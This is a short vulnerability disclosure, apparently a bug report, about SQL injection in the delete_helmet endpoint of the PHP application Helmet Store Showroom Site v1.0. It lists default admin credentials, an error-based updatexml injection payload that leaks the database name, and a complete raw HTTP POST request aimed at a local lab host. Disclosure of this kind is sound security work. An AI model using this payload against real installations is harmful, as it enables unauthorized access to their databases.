# Helmet Store Showroom Site v1.0 by oretnom23 has SQL injection

Vulnerability Discoverer: Yang Tao, TBLab of Venustech

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15851/helmet-store-showroom-site-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /hss/classes/Master.php?f=delete_helmet

Vulnerability location: /hss/classes/Master.php?f=delete_helmet,id

dbname =hss_db,length=6

[+] Payload:  id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id


```sql
POST /hss/classes/Master.php?f=delete_helmet HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=29mcgvmjo6mqsepd64ra2rlt4v
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/204070126-9ba3bb98-ec79-4ea6-ae28-b0bbf74736cd.png)
